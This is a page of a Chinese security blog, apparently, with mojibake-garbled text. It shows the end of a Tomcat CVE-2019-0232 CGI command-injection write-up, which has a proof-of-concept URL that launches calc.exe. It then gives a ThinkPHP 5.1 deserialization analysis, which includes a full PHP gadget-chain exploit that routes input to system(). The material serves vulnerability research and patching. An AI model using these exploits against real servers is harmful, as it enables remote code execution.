<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://localhost:8080/cgi-bin/hello.bat?&amp;C%3A%5CWindows%5CSystem32%5Ccalc.exe</span></span><br></pre></td></tr></table></figure>

<p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>
<p><img src="/.com//1.png" alt="image-20200404135313981"></p>
<h2 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h2><ol>
<li>ç¦ç”¨enableCmdLineArgumentså‚æ•°ã€‚</li>
<li>åœ¨conf/web.xmlä¸­è¦†å†™é‡‡ç”¨æ›´ä¸¥æ ¼çš„å‚æ•°åˆæ³•æ€§æ£€éªŒè§„åˆ™ã€‚</li>
<li>å‡çº§tomcatåˆ°9.0.17ä»¥ä¸Šç‰ˆæœ¬ã€‚</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/09/CVE-2019-0232/" data-id="ck8sqr5hc0002kou5hgucc8pd" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-thinkphp5-1ååºåˆ—åŒ–" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time datetime="2020-03-30T07:44:22.000Z" itemprop="datePublished">2020-03-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1ååºåˆ—åŒ–</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>TP5.1ååºåˆ—åŒ–æ¼æ´</p>
<p>è¿™é‡Œæˆ‘é€‰ç”¨çš„ç‰ˆæœ¬æ˜¯TP5.1.35</p>
<h1 id="æ¼æ´è§£æ"><a href="#æ¼æ´è§£æ" class="headerlink" title="æ¼æ´è§£æ"></a>æ¼æ´è§£æ</h1><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>åœ¨index.phpä¸­å†™å…¥æµ‹è¯•ä»£ç ï¼š</p>
<p><img src="/.com//2.png" alt></p>
<p><img src="/.com//1.png" alt></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"lin"</span>=&gt;[<span class="string">"calc.exe"</span>,<span class="string">"calc"</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"lin"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">'pho'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>â€‹        æƒ³è¦è·å¾—ä¸€æ¡ååºåˆ—åŒ–é“¾ï¼Œé¦–å…ˆå¾—æ‰¾åˆ°è‡ªåŠ¨è§¦å‘çš„é­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚<code>__wakeup(),__call(),__destruct()</code>ç­‰é­”æœ¯æ–¹æ³•.<strong>ç»è¿‡ä¸€äº›çš„è·³è½¬ã€‚æˆ‘ä»¬æœ€ç»ˆä¸€èˆ¬è¦è§¦å‘çš„é­”æœ¯æ–¹æ³•æ˜¯<code>__call()</code>ï¼Œå› ä¸ºè¿™ä¸ªé­”æœ¯æ–¹æ³•ä¸­ä¸€èˆ¬æ‰§è¡Œçš„æ˜¯<code>call_user_func()ï¼Œcall_user_func_arry()</code>è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œå¯ä»¥å¸¦æ¥å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</strong></p>
<p>è¿™æ¡æ”»å‡»é“¾ä»<code>/thinkphp/library/think/process/pipes/Windows.php</code>ä¸‹çš„<code>__destruct</code>ä½œä¸ºå…¥å£</p>
<p><img src="/.com//3.png" alt="image-20200314152252198"></p>
<p>å…¶ä¸­è°ƒç”¨ä¸¤ä¸ªå‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ç¬¬äºŒä¸ªå‡½æ•°<code>$this-&gt;removeFiles();</code></p>
<p><img src="/.com//4.png" alt="image-20200314152757525"></p>
<p>è¿™ä¸ªå‡½æ•°æ˜¯ç”¨äºåˆ é™¤ä¸´æ—¶æ–‡ä»¶çš„ï¼Œå…¶ä¸­çš„<code>file_exists($filename)</code>å¯ä»¥åˆ©ç”¨ï¼šå½“æˆ‘ä»¬å°†æŸç±»Açš„å®ä¾‹ä½œä¸º<code>$filename</code>ä¼ å…¥<code>file_exists()</code>æ—¶å°±ä¼šè§¦å‘ï¼Œå°±ä¼šè§¦å‘ç±»Açš„é­”æœ¯æ–¹æ³•<code>__toString</code>ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å…¨å±€æœç´¢<code>public function __toString()</code>,çœ‹çœ‹å“ªä¸ªç±»çš„è¯¥æ–¹æ³•å¯ä»¥ä½œä¸ºè·³æ¿ã€‚</p>
<p><img src="/.com//5.png" alt="image-20200314153303416"></p>
<p><code>thinkphp\library\think\model\concern\Conversion.php</code>å¯èƒ½å­˜åœ¨è·³æ¿</p>
<p>è·Ÿè¿›è¿™ä¸ªå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è·Ÿè¿›<code>toJson()</code></p>
<p><img src="/.com//6.png" alt="image-20200314155135827"></p>
<p>è·Ÿè¿›<code>toArray()</code>ï¼Œä»£ç å¤ªå¤šäº†ï¼Œè¿™é‡Œåªè·Ÿè¿›å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Â·Â·Â·</span><br><span class="line">        <span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">                        $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                        $relation-&gt;visible($name);</span><br><span class="line">                    &#125;</span><br><span class="line">        Â·Â·Â·</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¹‹æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©è¿™ä¸€æ®µä½œä¸ºå…³é”®ä»£ç ï¼š<strong>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>$å¯æ§å˜é‡-&gt;æ–¹æ³•(å‚æ•°å¯æ§)</code>çš„ä»£ç ï¼Œè¿™æ ·å­å°±å¯ä»¥è°ƒç”¨æŸä¸ªç±»çš„å®ä¾‹ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨è¯¥ç±»ä¸­çš„__call()å‡½æ•°ã€‚</strong>å…¶ä¸­æœ€ä¸ºå…³é”®çš„ä¸€è¡Œä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$relation-&gt;visible([$attr]);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ<code>$relation</code>å’Œ<code>$attr</code>éƒ½å¯æ§çš„è¯ï¼Œè¿™é‡Œå°±æœ‰ä¸€ä¸ªè·³æ¿ã€‚</p>
<p>ä»£ç ï¼š<code>$relation = $this-&gt;getRelation($key)</code>ï¼Œè·Ÿè¿›<code>getRelation()</code>ã€‚</p>
<p><img src="/.com//7.png" alt="image-20200314160646084"></p>
<p>è¿™é‡Œçš„<code>$this-&gt;relation</code>æ¥è‡ªäºå‡½æ•°<code>getRelation()</code>æ‰€åœ¨ç±»<code>RelationShip</code>ï¼Œæ‰€ä»¥è¯¥å˜é‡æˆ‘ä»¬æœªä½¿ç”¨åˆ°è¯¥å˜é‡ï¼Œæ‰€ä»¥æ— æ³•ä¿è¯<code>array_key_exists($name,$this-&gt;relation)</code>èƒ½å¤Ÿå¾—åˆ°æ»¡è¶³ã€‚</p>
<p>æ‰€ä»¥<code>$relation = $this-&gt;getRelation($key)</code>ä¸ºç©ºã€‚</p>
<p>è¿™æ ·å­å°±ä¼šè¿›å…¥ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">    $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    $relation-&gt;visible($name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>å…¨å±€æœç´¢<code>__call()</code>ï¼Œé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„è·³æ¿ã€‚</p>
<p><img src="/.com//8.png" alt="image-20200314161841261"></p>
<p>æ‰€æœ‰çš„<code>__call($method,$args)</code>éƒ½å·®ä¸å¤šï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€‰æ‹©è¿›å…¥<code>call_user_func()</code>çš„ä¸¤ä¸ªå‚æ•°å¯æ§çš„å‡½æ•°ï¼Œä½œä¸ºè·³æ¿ã€‚</p>
<p>é€‰æ‹©<code>Requestç±»</code>ï¼Œå…¶<code>__call()é­”æœ¯æ–¹æ³•</code>ä»£ç å¦‚ä¸‹ï¼š</p>
<p><img src="/.com//9.png" alt="image-20200314162321187"></p>
<p>å…¶ä¸­<code>args</code>ä»¥åŠ<code>$this-&gt;hook</code>éƒ½å¯æ§</p>
<p>å› ä¸ºå‰æ–‡è¯´åˆ°æˆ‘ä»¬çš„è·³æ¿ä¸º<code>$relation-&gt;visible($name);</code></p>
<p>é‚£ä¹ˆå½“è°ƒç”¨<code>Requests</code>ç±»ä¸­ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°<code>visible()</code>æ—¶ï¼Œè°ƒç”¨<code>__call()</code></p>
<p>å¯ä»¤<code>$hook= {â€œvisableâ€=&gt;â€œä»»æ„methodâ€}</code>ï¼Œè¿™æ ·è²Œä¼¼èƒ½å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>å¯æ˜¯åœ¨<code>__call()</code>ä¸­æœ‰ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_unshift($args, <span class="keyword">$this</span>);</span><br></pre></td></tr></table></figure>

<p><code>array_unshift()</code>å‡½æ•°ç”¨äºå‘æ•°ç»„æ’å…¥æ–°å…ƒç´ ï¼Œæ‰€ä»¥å®ƒä¼šæŠŠå½“å‰è¿™ä¸ªç±»ç»™åŠ åˆ°<code>args</code>ä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([$obj,<span class="string">"ä»»æ„æ–¹æ³•"</span>],[<span class="keyword">$this</span>,ä»»æ„å‚æ•°])</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å­å°±å¾ˆéš¾åšåˆ°å‘½ä»¤æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬è¦åœ¨è¯¥ç±»ä¸­å¯»æ‰¾ä¸€ä¸ªå‡½æ•°å¯ä»¥ä¸éœ€è¦ä¼ å‚ï¼Œä¹Ÿå°±æ˜¯ä¸éœ€è¦æˆ‘ä»¬ä¼ é€’ç»™å®ƒçš„<code>args</code></p>
<p>åœ¨<code>Requestsç±»</code>ä¸­æœ‰å‡½æ•°<code>filterValue()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">                <span class="comment">// è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤</span></span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                    <span class="comment">// æ­£åˆ™è¿‡æ»¤</span></span><br><span class="line">                    <span class="keyword">if</span> (!preg_match($filter, $value)) &#123;</span><br><span class="line">                        <span class="comment">// åŒ¹é…ä¸æˆåŠŸè¿”å›é»˜è®¤å€¼</span></span><br><span class="line">                        $value = $default;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($filter)) &#123;</span><br><span class="line">                    <span class="comment">// filterå‡½æ•°ä¸å­˜åœ¨æ—¶, åˆ™ä½¿ç”¨filter_varè¿›è¡Œè¿‡æ»¤</span></span><br><span class="line">                    <span class="comment">// filterä¸ºéæ•´å½¢å€¼æ—¶, è°ƒç”¨filter_idå–å¾—è¿‡æ»¤id</span></span><br><span class="line">                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">false</span> === $value) &#123;</span><br><span class="line">                        $value = $default;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªå‡½æ•°</p>
<p>æ‰¾åˆ°<code>input()</code>å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">            <span class="comment">// è·å–åŸå§‹æ•°æ®</span></span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $name = (string) $name;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">            <span class="comment">// è§£æname</span></span><br><span class="line">            <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">                <span class="keyword">return</span> $default;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">                <span class="keyword">return</span> $data;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">        $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">            array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">            <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">                <span class="comment">// æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>å“ªé‡Œè°ƒç”¨äº†<code>input()</code></p>
<p>æ‰¾åˆ°<code>param()</code>å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">            <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                    $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                    $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    $vars = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">            <span class="comment">// è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span></span><br><span class="line">            $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">            $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å“ªé‡Œè°ƒç”¨äº†<code>param()</code>å‡½æ•°</p>
<p>æ‰¾åˆ°äº†<code>isAja()</code></p>
<p><img src="/.com//10.png" alt="image-20200314164411714"></p>
<p>å…¶ä¸­çš„<code>$this-&gt;param($this-&gt;config[&#39;var_ajax&#39;])</code>ï¼Œè¿™é‡Œçš„<code>$this-&gt;config[&#39;var_ajax&#39;]</code>æ˜¯å¯æ§çš„ã€‚</p>
<p>æ•´ç†ä¸€ä¸‹å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="/.com//11.png" alt="image-20200314170425562"></p>
<p>è¿™é‡Œåˆ†æä¸€ä¸‹åœ¨<code>input()</code>ä¸­çš„<code>getData()</code></p>
<p><img src="/.com//12.png" alt="image-20200314171010145"></p>
<p>æ ¹æ®ä¸Šå›¾çš„è·¯ç”±ï¼Œå®é™…ä¸Šç»è¿‡å‡½æ•°<code>getData()</code>å,<code>data[$val] = data[$name]</code></p>
<p>è·Ÿè¿›å‡½æ•°<code>getFilter()</code></p>
<p><img src="/.com//14.png" alt="image-20200314171334782"></p>
<p>å…¶ä¸­<code>$filter = $filter ?: $this-&gt;filter;</code></p>
<p>æ‰€ä»¥<code>$filter</code>å¯æ§</p>
<p>æ¥ç€ç”±äº<code>$dataéæ•°ç»„</code>ï¼Œè·Ÿè¿›å‡½æ•°<code>$this-&gt;filterValue($data, $name, $filter);</code></p>
<p><img src="/.com//14.png" alt="image-20200314171334782"></p>
